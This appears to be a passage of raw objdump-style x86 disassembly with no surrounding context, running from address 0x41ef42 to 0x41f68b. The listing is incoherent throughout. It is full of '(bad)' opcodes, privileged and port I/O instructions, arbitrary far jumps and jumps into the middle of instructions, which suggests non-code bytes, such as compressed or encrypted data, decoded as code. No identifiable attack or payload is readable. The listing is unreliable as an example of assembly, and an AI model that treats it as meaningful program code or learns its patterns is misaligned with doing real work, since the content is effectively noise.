  41ef42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef43:	mov    ds:0xca9fd589,al
  41ef48:	and    cl,ch
  41ef4a:	dec    edx
  41ef4b:	mov    al,ds:0x2a4205bc
  41ef50:	stc    
  41ef51:	dec    ecx
  41ef52:	stos   DWORD PTR es:[edi],eax
  41ef53:	mov    gs:0x78ad5d45,eax
  41ef59:	push   esp
  41ef5a:	pop    ds
  41ef5b:	xor    edx,esp
  41ef5d:	mov    cl,0x2f
  41ef5f:	ss jae 0x41ef65
  41ef62:	pop    eax
  41ef63:	sub    eax,0xc0fe9714
  41ef68:	xor    al,0x7b
  41ef6a:	fs push ecx
  41ef6c:	enter  0xddd9,0xce
  41ef70:	push   cs
  41ef71:	adc    cl,BYTE PTR [ebp-0x71d1419d]
  41ef77:	int3   
  41ef78:	stos   BYTE PTR es:[edi],al
  41ef79:	jne    0x41eeff
  41ef7b:	aam    0x55
  41ef7d:	into   
  41ef7e:	dec    DWORD PTR [edx+esi*1]
  41ef81:	(bad)  
  41ef82:	pop    ds
  41ef83:	pop    ecx
  41ef84:	enter  0x4d10,0xb2
  41ef88:	xchg   BYTE PTR [ecx+0x7f],bl
  41ef8b:	cdq    
  41ef8c:	xchg   esp,eax
  41ef8d:	mov    al,ds:0x3cebd6c3
  41ef92:	add    DWORD PTR [esi],eax
  41ef94:	int3   
  41ef95:	sub    DWORD PTR [esi+0xc],0xffffffd4
  41ef99:	inc    eax
  41ef9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef9b:	cmp    eax,0x9b6308e9
  41efa0:	sahf   
  41efa1:	lods   al,BYTE PTR ds:[esi]
  41efa2:	push   cs
  41efa3:	push   edi
  41efa4:	xor    BYTE PTR [edx+0x63cdd411],cl
  41efaa:	in     eax,0x1a
  41efac:	xchg   edi,eax
  41efad:	ret    0x5391
  41efb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efb1:	push   ebp
  41efb2:	out    dx,eax
  41efb3:	daa    
  41efb4:	mov    BYTE PTR [ebx],ah
  41efb6:	dec    edi
  41efb7:	sub    esi,esi
  41efb9:	inc    ebp
  41efba:	mov    ss,ebp
  41efbc:	ror    DWORD PTR [edx],cl
  41efbe:	cmc    
  41efbf:	sbb    dh,0x43
  41efc2:	cld    
  41efc3:	adc    cl,BYTE PTR [eax+0x652dcf65]
  41efc9:	dec    esp
  41efca:	inc    edx
  41efcb:	jns    0x41f039
  41efcd:	add    ecx,esp
  41efcf:	jae    0x41f033
  41efd1:	jmp    0x41ef88
  41efd3:	arpl   WORD PTR [edx+edi*2+0x7c0da71f],si
  41efda:	div    BYTE PTR [esi+0x7c44dabb]
  41efe0:	add    al,0x7d
  41efe2:	pop    ds
  41efe3:	aad    0x8d
  41efe5:	loope  0x41f013
  41efe7:	lea    eax,[edi]
  41efe9:	into   
  41efea:	jge    0x41efe3
  41efec:	and    DWORD PTR [ecx+ebp*8+0x6b],0xffffffb4
  41eff1:	rol    DWORD PTR [eax],0xd
  41eff4:	pushf  
  41eff5:	jo     0x41eff4
  41eff7:	aam    0xbc
  41eff9:	or     al,cl
  41effb:	dec    edx
  41effc:	jnp    0x41f024
  41effe:	adc    eax,0x2d2bfe71
  41f003:	pushf  
  41f004:	mov    bl,0x98
  41f006:	pusha  
  41f007:	bound  ebx,QWORD PTR [edi]
  41f009:	mov    DWORD PTR [ecx-0x1a1c4f83],esp
  41f00f:	hlt    
  41f010:	icebp  
  41f011:	add    BYTE PTR [ebx+eiz*8],bl
  41f014:	dec    edi
  41f015:	stos   BYTE PTR es:[edi],al
  41f016:	clc    
  41f017:	lea    ecx,[edx-0x768cfb13]
  41f01d:	aaa    
  41f01e:	push   esi
  41f01f:	mov    bh,0xc3
  41f021:	inc    ebx
  41f022:	pop    es
  41f023:	fst    QWORD PTR [ebp+0x2]
  41f026:	and    BYTE PTR [ebp+ecx*2-0x69],ch
  41f02a:	clc    
  41f02b:	jmp    0x5e82:0xc51f0039
  41f032:	das    
  41f033:	test   eax,0xd45e79f2
  41f038:	mov    al,ds:0x6225f9ad
  41f03d:	or     BYTE PTR [edi+0x7b51898e],bh
  41f043:	mov    dl,BYTE PTR [edx]
  41f045:	imul   esp,eax,0xbc002e6b
  41f04b:	mov    ah,0x2b
  41f04d:	sub    ecx,DWORD PTR [ebp+0x36f04a49]
  41f053:	xchg   esp,eax
  41f054:	pop    ecx
  41f055:	mov    ebx,DWORD PTR [esi-0x71fd8e19]
  41f05b:	mov    bl,0x4
  41f05d:	sbb    dh,BYTE PTR [eax+0x54]
  41f060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f061:	(bad)  
  41f062:	out    dx,eax
  41f063:	aad    0xba
  41f065:	or     al,0xf4
  41f067:	adc    eax,0x99bba3
  41f06c:	(bad)  
  41f06d:	(bad)  [edi-0x6f]
  41f070:	test   BYTE PTR [ecx*2-0x6b98499b],dl
  41f077:	int3   
  41f078:	jmp    0xdeef:0xc5ab3a02
  41f07f:	mov    bh,0x3b
  41f081:	ins    DWORD PTR es:[edi],dx
  41f082:	pop    ds
  41f083:	rcr    DWORD PTR [ebx],1
  41f085:	xor    esp,DWORD PTR [edi+ebp*4]
  41f088:	and    bh,BYTE PTR [edi+0x4]
  41f08b:	xlat   BYTE PTR ds:[ebx]
  41f08c:	or     al,0x71
  41f08e:	fiadd  DWORD PTR [esi+eiz*8-0x23]
  41f092:	in     al,0xc9
  41f094:	xchg   edi,eax
  41f095:	mov    ch,0xcf
  41f097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f098:	ins    DWORD PTR es:[edi],dx
  41f099:	add    ebp,eax
  41f09b:	add    BYTE PTR [eax+ecx*4],ch
  41f09e:	mov    esp,0x3eae96d5
  41f0a3:	mov    edx,0x1e5acf9e
  41f0a8:	mov    cl,ch
  41f0aa:	(bad)  
  41f0ac:	ror    DWORD PTR [eax-0x2],1
  41f0af:	xchg   esp,eax
  41f0b0:	pop    esp
  41f0b1:	hlt    
  41f0b2:	ret    
  41f0b3:	mov    ebx,0x1cae2184
  41f0b8:	ret    0x93ad
  41f0bb:	loope  0x41f045
  41f0bd:	mov    ebx,DWORD PTR [edx+0x3e]
  41f0c0:	jbe    0x41f07f
  41f0c2:	cmp    dl,bh
  41f0c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0c5:	xor    eax,0xb693eafd
  41f0ca:	xor    ebx,ecx
  41f0cc:	mov    BYTE PTR [edi-0x2c],ah
  41f0cf:	(bad)  
  41f0d0:	sbb    al,0x34
  41f0d2:	sbb    cl,dl
  41f0d4:	add    DWORD PTR [edx],0x3e6a46f2
  41f0da:	shl    cl,cl
  41f0dc:	jae    0x41f05f
  41f0de:	inc    ebx
  41f0df:	imul   edi,edi,0x182f60ed
  41f0e5:	std    
  41f0e6:	lea    edi,[esi-0x649dfd9b]
  41f0ec:	push   edx
  41f0ed:	ret    0xa78a
  41f0f0:	pop    edx
  41f0f1:	enter  0x2690,0x88
  41f0f5:	gs arpl si,di
  41f0f8:	pop    esi
  41f0f9:	(bad)  
  41f0fa:	jnp    0x41f0a5
  41f0fc:	test   BYTE PTR [ecx],0xde
  41f0ff:	aam    0x62
  41f101:	js     0x41f149
  41f103:	or     DWORD PTR [eax],edx
  41f105:	xlat   BYTE PTR ds:[ebx]
  41f106:	in     eax,0x55
  41f108:	mov    BYTE PTR [ebx+0x3c],dh
  41f10b:	jmp    DWORD PTR [ebx]
  41f10d:	push   ebp
  41f10e:	mov    ds:0xe002def3,al
  41f113:	lds    edx,FWORD PTR [edi+eax*1]
  41f116:	pushf  
  41f117:	das    
  41f118:	out    dx,eax
  41f119:	dec    ebx
  41f11a:	popa   
  41f11b:	outs   dx,DWORD PTR ds:[esi]
  41f11c:	push   DWORD PTR [esi]
  41f11e:	or     al,0xfd
  41f120:	mov    ds:0x7ecef4a,al
  41f125:	add    bh,BYTE PTR [eax-0x41]
  41f128:	inc    edi
  41f129:	jns    0x41f17f
  41f12b:	mov    bl,0x47
  41f12d:	push   cs
  41f12e:	jne    0x41f0f5
  41f130:	jae    0x41f131
  41f132:	cdq    
  41f133:	xlat   BYTE PTR ds:[ebx]
  41f134:	mov    ecx,0x785a3974
  41f139:	daa    
  41f13a:	scas   eax,DWORD PTR es:[edi]
  41f13b:	aad    0xc2
  41f13d:	push   0xbf1fe570
  41f142:	arpl   WORD PTR [eax-0x7b7d1078],dx
  41f148:	mov    DWORD PTR [eax+0x276817aa],ecx
  41f14e:	repnz mov WORD PTR [ebx],fs
  41f151:	cmc    
  41f152:	fild   QWORD PTR [edx+0x54]
  41f155:	stc    
  41f156:	sti    
  41f157:	inc    ecx
  41f158:	xchg   esi,eax
  41f159:	iret   
  41f15a:	xlat   BYTE PTR ds:[ebx]
  41f15b:	enter  0x2e5,0x3e
  41f15f:	inc    edi
  41f160:	(bad)  
  41f161:	ret    0x8b65
  41f164:	in     al,dx
  41f165:	out    0x4d,eax
  41f167:	aam    0xa3
  41f169:	adc    al,0x41
  41f16b:	and    esi,DWORD PTR [eax+0x13eb1e4b]
  41f171:	test   DWORD PTR ds:0xf07f3691,ebx
  41f177:	in     al,dx
  41f178:	into   
  41f179:	adc    BYTE PTR [esi+0x6d],dh
  41f17c:	adc    eax,0x89077cad
  41f181:	(bad)  
  41f182:	jmp    0x41f11c
  41f184:	inc    ebp
  41f185:	sbb    eax,0x5cebfd1f
  41f18a:	stos   BYTE PTR es:[edi],al
  41f18b:	or     DWORD PTR [esi],ebx
  41f18d:	inc    esp
  41f18e:	imul   edi,DWORD PTR [ecx-0x3d371736],0xffffffc9
  41f195:	cmp    BYTE PTR [edx+0x40bce920],ch
  41f19b:	clc    
  41f19c:	mov    dh,BYTE PTR [ebx]
  41f19e:	cld    
  41f19f:	and    al,0x96
  41f1a1:	cmp    ebx,DWORD PTR [ebp+0x5a497807]
  41f1a7:	int3   
  41f1a8:	test   DWORD PTR ds:0x825a3532,eax
  41f1ae:	repnz mov dh,0xed
  41f1b1:	mov    ?,WORD PTR [ebx-0x4f]
  41f1b4:	sti    
  41f1b5:	xor    eax,0xc0f613d5
  41f1ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1bb:	adc    eax,0xd56fa104
  41f1c0:	mov    esi,0x824cf0ed
  41f1c5:	and    ebx,esi
  41f1c7:	xor    DWORD PTR [eax+0x72bf4fa1],ecx
  41f1cd:	stos   DWORD PTR es:[edi],eax
  41f1ce:	and    al,0x4
  41f1d0:	mov    ah,0x1f
  41f1d2:	push   es
  41f1d3:	cdq    
  41f1d4:	scas   eax,DWORD PTR es:[edi]
  41f1d5:	dec    ecx
  41f1d6:	stc    
  41f1d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1d8:	aas    
  41f1d9:	das    
  41f1da:	dec    esi
  41f1db:	push   cs
  41f1dc:	pop    esi
  41f1dd:	cld    
  41f1de:	adc    eax,0xc14ffcb6
  41f1e3:	aad    0xb0
  41f1e5:	xchg   ebx,eax
  41f1e6:	mov    dl,0x13
  41f1e8:	(bad)  
  41f1e9:	aam    0xd4
  41f1eb:	aad    0x68
  41f1ed:	add    DWORD PTR [edx],ebp
  41f1ef:	or     al,0xbc
  41f1f1:	hlt    
  41f1f2:	and    ch,cl
  41f1f4:	mov    DWORD PTR [ebx],ebx
  41f1f6:	cs retf 0x1b41
  41f1fa:	nop
  41f1fb:	outs   dx,DWORD PTR ds:[esi]
  41f1fc:	sbb    ah,BYTE PTR [edi]
  41f1fe:	and    al,0xb4
  41f200:	lock mov dl,0x20
  41f203:	(bad)  
  41f205:	dec    edi
  41f206:	xor    ebx,ebx
  41f208:	mov    BYTE PTR [edi-0x1285446],bl
  41f20e:	sbb    BYTE PTR [ecx-0x34fe7f4],ah
  41f214:	add    ch,BYTE PTR [esi]
  41f216:	rcl    BYTE PTR [eax+eax*4-0x32],0x26
  41f21b:	xchg   DWORD PTR [eax-0x1649a777],ecx
  41f221:	inc    edx
  41f222:	add    BYTE PTR [ecx+eiz*2-0x294cebfd],ch
  41f229:	mov    bl,0x5c
  41f22b:	sbb    edi,eax
  41f22d:	cs pop ds
  41f22f:	test   DWORD PTR [eax-0x19163eb7],edx
  41f235:	sbb    al,0x4d
  41f237:	aam    0xcf
  41f239:	jmp    0xac10:0x8cfd1d02
  41f240:	mov    DWORD PTR [edi],ebp
  41f242:	fisubr DWORD PTR [edi]
  41f244:	daa    
  41f245:	jp     0x41f2b7
  41f247:	jnp    0x41f2c5
  41f249:	jecxz  0x41f212
  41f24b:	aad    0xf1
  41f24d:	scas   al,BYTE PTR es:[edi]
  41f24e:	inc    esp
  41f24f:	jae    0x41f234
  41f251:	addr16 mov bl,0x76
  41f254:	ja     0x41f236
  41f256:	pusha  
  41f257:	pop    edi
  41f258:	std    
  41f259:	jmp    0x41f27c
  41f25b:	xchg   edx,eax
  41f25c:	xchg   BYTE PTR [esi+ebp*2-0x5556122b],ch
  41f263:	fisub  DWORD PTR [ebp-0x41]
  41f266:	xchg   edx,eax
  41f267:	fwait
  41f268:	test   al,0x72
  41f26a:	pop    ds
  41f26b:	add    eax,0xc9ac0943
  41f270:	push   eax
  41f271:	jae    0x41f27b
  41f273:	aam    0x6c
  41f275:	int3   
  41f276:	jne    0x41f2aa
  41f278:	jg     0x41f217
  41f27a:	mov    ss,WORD PTR ds:0x8ceaff89
  41f280:	or     BYTE PTR [ecx+0x28],0x2a
  41f284:	cwde   
  41f285:	add    eax,0x4cbc8868
  41f28a:	call   0x8f70:0x18aad0b6
  41f291:	or     eax,0xb6b06e65
  41f296:	adc    esp,DWORD PTR [esp+ebx*8-0x1d]
  41f29a:	push   ebx
  41f29b:	aad    0xc7
  41f29d:	jbe    0x41f2f3
  41f29f:	pop    edx
  41f2a0:	vmread ecx,eax
  41f2a3:	iret   
  41f2a4:	mov    ebx,ebp
  41f2a6:	je     0x3b3ce739
  41f2ac:	add    DWORD PTR [edx],0x4
  41f2af:	out    0x5f,eax
  41f2b1:	out    dx,eax
  41f2b2:	cmp    al,0x25
  41f2b4:	dec    esi
  41f2b5:	lahf   
  41f2b6:	adc    esi,DWORD PTR [esi]
  41f2b8:	icebp  
  41f2b9:	lds    ecx,FWORD PTR [edi-0x2b]
  41f2bc:	push   esi
  41f2bd:	mov    esp,0x83566f67
  41f2c2:	xor    edi,edx
  41f2c4:	mov    WORD PTR [edx+ebp*1+0x3c083c58],ds
  41f2cb:	pop    esp
  41f2cc:	mov    BYTE PTR [ecx+0x435d5a41],al
  41f2d2:	dec    ebp
  41f2d3:	call   0x92a:0x95462480
  41f2da:	lahf   
  41f2db:	ret    0xaaee
  41f2de:	(bad)  
  41f2df:	push   ss
  41f2e0:	mov    DWORD PTR [edi],edx
  41f2e2:	xor    eax,0x9801e716
  41f2e7:	mov    eax,0xa4449f3
  41f2ec:	mov    es,WORD PTR [ebp+0x23c03a31]
  41f2f2:	xchg   edi,eax
  41f2f3:	xchg   edi,eax
  41f2f4:	mov    BYTE PTR [ecx+0x34],bl
  41f2f7:	enter  0xfa62,0x48
  41f2fb:	dec    ebx
  41f2fc:	repnz add eax,0x84b7ff54
  41f302:	icebp  
  41f303:	cmp    BYTE PTR [ebx-0x4f26e0c2],0xbc
  41f30a:	clc    
  41f30b:	sbb    ecx,DWORD PTR [ebx]
  41f30d:	pop    ebp
  41f30e:	arpl   WORD PTR [ebp+0x5d],ax
  41f311:	aad    0x1f
  41f313:	pop    ecx
  41f314:	lahf   
  41f315:	dec    esi
  41f316:	cwde   
  41f317:	xor    ah,ah
  41f319:	mov    al,0x1f
  41f31b:	cmp    ecx,esp
  41f31d:	mov    ecx,0x53a6bcdf
  41f322:	fst    st(5)
  41f324:	and    BYTE PTR ds:0xff7ee88a,al
  41f32a:	xchg   esp,eax
  41f32b:	mov    eax,ds:0x2f45d388
  41f330:	sub    BYTE PTR [edi+eiz*2],cl
  41f333:	adc    al,0x63
  41f335:	add    esi,DWORD PTR [eax]
  41f337:	xchg   ebx,eax
  41f338:	clc    
  41f339:	int3   
  41f33a:	(bad)  
  41f33b:	adc    bl,bh
  41f33d:	pusha  
  41f33e:	popa   
  41f33f:	cdq    
  41f340:	loop   0x41f2c2
  41f342:	add    ah,BYTE PTR [ebx]
  41f344:	pop    ds
  41f345:	mov    esp,DWORD PTR [ecx+0xfbf399d]
  41f34b:	inc    ebx
  41f34c:	mov    ebp,0x59af1f65
  41f351:	jmp    DWORD PTR [edx]
  41f353:	and    DWORD PTR [ecx-0x7758048d],ebx
  41f359:	sbb    ch,BYTE PTR [edi+ebp*4+0x5d]
  41f35d:	add    bh,BYTE PTR [edx+ecx*1+0x4b3d24c8]
  41f364:	outs   dx,DWORD PTR ds:[esi]
  41f365:	jmp    0xdefe:0xdb89861a
  41f36c:	sbb    eax,0x94d3b150
  41f371:	add    eax,0xdaea6198
  41f376:	xor    al,BYTE PTR [esp+eax*2+0x7c]
  41f37a:	push   ds
  41f37b:	mov    bl,0x7d
  41f37d:	lods   al,BYTE PTR ds:[esi]
  41f37e:	repz mov ss,WORD PTR [ebx-0x4e1156c6]
  41f385:	fdivp  st(7),st
  41f387:	aad    0xc9
  41f389:	mov    ch,0x8e
  41f38b:	mov    BYTE PTR [ecx-0x4ad1dcdb],cl
  41f391:	sar    BYTE PTR [ebp-0x3bfe7ce8],1
  41f397:	inc    edi
  41f398:	iret   
  41f399:	shl    BYTE PTR [ecx],cl
  41f39b:	mov    dh,0x48
  41f39d:	jmp    0x41f326
  41f39f:	dec    ebp
  41f3a0:	mov    DWORD PTR [ecx-0x36ae8581],edx
  41f3a6:	dec    esi
  41f3a7:	xchg   BYTE PTR [ebp+0x2],dh
  41f3aa:	push   0xfffffff4
  41f3ac:	sbb    BYTE PTR [ebp+0x35b438cf],cl
  41f3b2:	pusha  
  41f3b3:	adc    DWORD PTR [edx-0x79105571],eax
  41f3b9:	scas   eax,DWORD PTR es:[edi]
  41f3ba:	or     ch,bh
  41f3bc:	fldcw  WORD PTR [ecx]
  41f3be:	push   edx
  41f3bf:	dec    edi
  41f3c0:	pusha  
  41f3c1:	stos   BYTE PTR es:[edi],al
  41f3c2:	(bad)
  41f3c5:	cwde   
  41f3c6:	dec    esp
  41f3c7:	fstp   TBYTE PTR [eax-0xd]
  41f3ca:	ss dec edx
  41f3cc:	mov    ecx,edx
  41f3ce:	arpl   WORD PTR [esi+0x4b735c33],sp
  41f3d4:	imul   eax,DWORD PTR [edx],0xffffff82
  41f3d7:	xchg   edi,eax
  41f3d8:	add    eax,0xf25ab456
  41f3dd:	or     ah,BYTE PTR gs:[ebp+0x1bbb8f89]
  41f3e4:	or     eax,0x270d641
  41f3e9:	and    eax,0xe627dd52
  41f3ee:	lahf   
  41f3ef:	xor    eax,0x5cb95320
  41f3f4:	mov    ebx,esi
  41f3f6:	xchg   BYTE PTR [ebx+esi*8+0x16f5e573],bl
  41f3fd:	add    DWORD PTR [edi+eax*8],edi
  41f400:	xlat   BYTE PTR ds:[ebx]
  41f401:	jb     0x41f3e0
  41f403:	sub    esi,DWORD PTR [esi+0x42]
  41f406:	aam    0x69
  41f408:	mov    BYTE PTR [ecx-0x61],ch
  41f40b:	ds das 
  41f40d:	fdiv   QWORD PTR [esi]
  41f40f:	pop    edx
  41f410:	dec    edx
  41f411:	add    ch,al
  41f413:	jmp    0x3124079d
  41f418:	lods   al,BYTE PTR ds:[esi]
  41f419:	mov    dl,0x19
  41f41b:	in     al,0x89
  41f41d:	inc    ecx
  41f41e:	sar    BYTE PTR [edi],1
  41f420:	push   esp
  41f421:	loop   0x41f46b
  41f423:	stc    
  41f424:	fimul  DWORD PTR [ecx-0x5877a023]
  41f42a:	aad    0xb0
  41f42c:	push   cs
  41f42d:	push   0x41b3223c
  41f432:	or     ebp,0x8
  41f435:	pop    eax
  41f436:	popa   
  41f437:	ret    
  41f438:	bnd ja 0x41f447
  41f43b:	xlat   BYTE PTR ds:[ebx]
  41f43c:	aad    0xf
  41f43e:	out    0x11,eax
  41f440:	clc    
  41f441:	ja     0x41f3e0
  41f443:	pop    ds
  41f444:	mov    DWORD PTR [ebx+0x35],esp
  41f447:	add    DWORD PTR [ebx+0x5b],ecx
  41f44a:	add    esi,DWORD PTR [esi]
  41f44c:	mov    WORD PTR [esi],ds
  41f44e:	dec    eax
  41f44f:	rol    BYTE PTR [ecx],0x42
  41f452:	fadd   st(7),st
  41f454:	mov    esp,DWORD PTR [edi+edi*8-0x55]
  41f458:	hlt    
  41f459:	iret   
  41f45a:	add    BYTE PTR [edi+0x4d],dl
  41f45d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f45e:	push   cs
  41f45f:	pop    esi
  41f460:	mov    BYTE PTR [ebx-0x14],cl
  41f463:	jbe    0x41f422
  41f465:	test   eax,0x8ec7b5b6
  41f46a:	out    dx,eax
  41f46b:	call   0x40df:0xb85caf88
  41f472:	adc    eax,0x5ae189d5
  41f477:	mov    ds:0xb5d6b5e8,al
  41f47c:	jg     0x41f4ba
  41f47e:	or     DWORD PTR fs:[ebx+eax*1+0x666e27d0],esp
  41f486:	jb     0x41f48d
  41f488:	cmp    edx,ebx
  41f48a:	data16 sti 
  41f48c:	adc    ebp,DWORD PTR [ebp+0x46]
  41f48f:	jmp    0x101a9a44
  41f494:	daa    
  41f495:	add    edi,edx
  41f497:	xchg   DWORD PTR [ecx],esp
  41f499:	adc    eax,0xddc92f79
  41f49e:	js     0x41f437
  41f4a0:	rcr    DWORD PTR [esi],cl
  41f4a2:	or     esi,DWORD PTR [eax]
  41f4a4:	into   
  41f4a5:	std    
  41f4a6:	mov    ch,0xd4
  41f4a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4aa:	or     DWORD PTR [esi+0x4de597cd],ecx
  41f4b0:	mov    DWORD PTR [ebx+0x64],esi
  41f4b3:	call   DWORD PTR gs:[eax-0x1e070a23]
  41f4ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4bb:	aad    0xef
  41f4bd:	in     al,0x3b
  41f4bf:	sub    al,0xa8
  41f4c1:	dec    eax
  41f4c2:	or     al,0x1d
  41f4c4:	cmc    
  41f4c5:	imul   ecx,DWORD PTR [ebp+0x214660ba],0x2647e7d4
  41f4cf:	jle    0x41f451
  41f4d1:	sub    DWORD PTR [ebp+esi*4-0xb],edi
  41f4d5:	mov    bl,0x26
  41f4d7:	add    eax,0xf680e52f
  41f4dc:	sub    BYTE PTR [ecx],0x64
  41f4df:	dec    ebx
  41f4e0:	pushf  
  41f4e1:	jl     0x41f4d3
  41f4e3:	lahf   
  41f4e4:	dec    esp
  41f4e5:	arpl   cx,di
  41f4e7:	xor    al,0xe4
  41f4e9:	add    eax,0x4473986e
  41f4ee:	adc    al,ch
  41f4f0:	add    al,0xb2
  41f4f2:	ins    DWORD PTR es:[edi],dx
  41f4f3:	inc    ecx
  41f4f4:	xor    eax,0x363fae79
  41f4f9:	adc    BYTE PTR [eax],0x12
  41f4fc:	pop    edx
  41f4fd:	mov    al,ds:0x166aad08
  41f502:	mov    ch,0x17
  41f504:	shr    ebx,cl
  41f506:	out    0x18,al
  41f508:	dec    ecx
  41f509:	sub    ecx,ebp
  41f50b:	enter  0x1f88,0x1d
  41f50f:	sbb    DWORD PTR [esp+edi*1],ecx
  41f512:	enter  0x47d1,0x2
  41f516:	pushf  
  41f517:	add    esi,DWORD PTR [ebx]
  41f519:	into   
  41f51a:	ins    DWORD PTR es:[edi],dx
  41f51b:	sbb    al,0x55
  41f51d:	sbb    DWORD PTR [edi],ebx
  41f51f:	sub    eax,0xe3f4ac67
  41f524:	and    eax,0x74c456c1
  41f529:	xor    bl,al
  41f52b:	popf   
  41f52c:	imul   edi,DWORD PTR [ebx],0x378a2b76
  41f532:	sub    al,0xa9
  41f534:	cmp    dh,BYTE PTR [esi]
  41f536:	out    dx,al
  41f537:	xchg   esi,eax
  41f538:	push   0x8bd72afd
  41f53d:	(bad)  
  41f53e:	repnz lock push esi
  41f541:	adc    BYTE PTR [edi-0x621c3efe],0x7d
  41f548:	mov    bl,0xf5
  41f54a:	lahf   
  41f54b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f54c:	push   eax
  41f54d:	dec    esi
  41f54e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f54f:	dec    esp
  41f550:	sbb    BYTE PTR ds:0x6024252a,ah
  41f556:	push   ds
  41f557:	jne    0x41f53b
  41f559:	pop    ss
  41f55a:	fisttp DWORD PTR [eax]
  41f55c:	mov    cl,ch
  41f55e:	stos   BYTE PTR es:[edi],al
  41f55f:	sub    al,0x75
  41f561:	ret    
  41f562:	addr16 jne 0x41f584
  41f565:	add    ecx,DWORD PTR [esp+esi*8+0x67]
  41f569:	cs pop ebp
  41f56b:	jge    0x41f527
  41f56d:	xlat   BYTE PTR ds:[ebx]
  41f56e:	outs   dx,BYTE PTR ds:[esi]
  41f56f:	stos   DWORD PTR es:[edi],eax
  41f570:	push   ebx
  41f571:	dec    ebp
  41f572:	mov    ss,WORD PTR [esi+0x531182c9]
  41f578:	nop
  41f579:	add    dl,BYTE PTR [eax-0x62]
  41f57c:	cdq    
  41f57d:	sbb    cl,bl
  41f57f:	(bad)  
  41f580:	cmc    
  41f581:	stos   DWORD PTR es:[edi],eax
  41f582:	pop    ds
  41f583:	imul   ebp,ebx,0xffffffaa
  41f586:	(bad)  
  41f587:	out    dx,eax
  41f588:	dec    edx
  41f589:	fwait
  41f58a:	xor    edx,esp
  41f58c:	mov    esi,0x8b656e83
  41f591:	xor    ah,BYTE PTR [ebp-0x3d]
  41f594:	mov    bh,bh
  41f596:	and    bl,BYTE PTR [esi]
  41f598:	sbb    eax,0xd9bfc1f
  41f59d:	add    esp,DWORD PTR [ebx+ebp*4-0x3a616596]
  41f5a4:	fadd   QWORD PTR [ebx]
  41f5a6:	pop    ds
  41f5a7:	(bad)  
  41f5a8:	mov    cl,0xb3
  41f5aa:	nop
  41f5ab:	dec    ebx
  41f5ac:	stos   BYTE PTR es:[edi],al
  41f5ad:	push   0x3dbd9fdd
  41f5b2:	and    edx,DWORD PTR [esi+eax*1-0x5f]
  41f5b6:	in     eax,0x61
  41f5b8:	push   edi
  41f5b9:	addr16 pop ds
  41f5bb:	cdq    
  41f5bc:	cmp    BYTE PTR [ecx-0x169c744c],ch
  41f5c2:	stos   DWORD PTR es:[edi],eax
  41f5c3:	inc    ecx
  41f5c4:	mov    WORD PTR [ebp-0x4e03c38b],ds
  41f5ca:	jl     0x41f58b
  41f5cc:	dec    ecx
  41f5cd:	dec    eax
  41f5ce:	repz or BYTE PTR [edx-0x80],dh
  41f5d2:	pusha  
  41f5d3:	adc    ebp,DWORD PTR [edi]
  41f5d5:	les    esp,FWORD PTR [esi+esi*4-0x12]
  41f5d9:	jnp    0x41f5ca
  41f5db:	aam    0xd7
  41f5dd:	xor    DWORD PTR [edx-0x14179166],esp
  41f5e3:	pop    edx
  41f5e4:	idiv   DWORD PTR [edi]
  41f5e6:	(bad)  
  41f5e7:	enter  0xf340,0x24
  41f5eb:	and    ecx,DWORD PTR [eax-0x6831377b]
  41f5f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5f2:	adc    bl,BYTE PTR [edi+0xe]
  41f5f5:	sbb    al,0xac
  41f5f7:	lods   eax,DWORD PTR ds:[esi]
  41f5f8:	ds push 0x4ed84578
  41f5fe:	mov    esi,0x99a3885b
  41f603:	bound  ebp,QWORD PTR [edi]
  41f605:	stos   BYTE PTR es:[edi],al
  41f606:	ret    0xf61c
  41f609:	xor    eax,0xd290d4ff
  41f60e:	mov    BYTE PTR [esi+0x74],cl
  41f611:	fidivr WORD PTR [ebx]
  41f613:	les    ecx,FWORD PTR [ecx-0xec5ea31]
  41f619:	dec    ebx
  41f61a:	jns    0x41f5c5
  41f61c:	mov    esp,0x60077c01
  41f621:	fdivr  QWORD PTR [eax-0xb]
  41f624:	or     ah,dl
  41f626:	cmp    ecx,DWORD PTR [esi+esi*4-0x6d]
  41f62a:	dec    ebx
  41f62b:	push   eax
  41f62c:	mov    BYTE PTR [esi+0xc92f227],cl
  41f632:	mov    eax,0x624474d2
  41f637:	mov    bl,0x9d
  41f639:	mov    ?,eax
  41f63b:	(bad)  
  41f63c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f63d:	(bad)  
  41f63e:	pusha  
  41f63f:	imul   edi,DWORD PTR [ebx+0x23],0xffffff88
  41f643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f644:	sbb    BYTE PTR [ebx],dl
  41f646:	sbb    eax,0xdf7619d7
  41f64b:	and    BYTE PTR [ebx],0xe5
  41f64e:	mov    eax,ds:0x6e538ba1
  41f653:	sub    edx,esi
  41f655:	cmp    ebx,edx
  41f657:	cdq    
  41f658:	js     0x41f6b1
  41f65a:	sbb    BYTE PTR [edx+0x7ea3b767],ch
  41f660:	jmp    0x41f662
  41f662:	xchg   esp,eax
  41f663:	sub    al,0x77
  41f665:	ret    0xca5
  41f668:	mov    DWORD PTR [ebp+0x4a6e401b],esi
  41f66e:	dec    edx
  41f66f:	add    BYTE PTR [esi+0x3],bl
  41f672:	mov    ?,WORD PTR [ecx-0x70]
  41f675:	(bad)  
  41f676:	clc    
  41f677:	js     0x41f615
  41f679:	test   DWORD PTR [edi],0xb04b87c5
  41f67f:	jl     0x41f668
  41f681:	xor    al,0x5e
  41f683:	dec    edi
  41f684:	push   ss
  41f685:	ins    DWORD PTR es:[edi],dx
  41f686:	push   0x4e1446d4
  41f68b:	jl     0x41f6b4
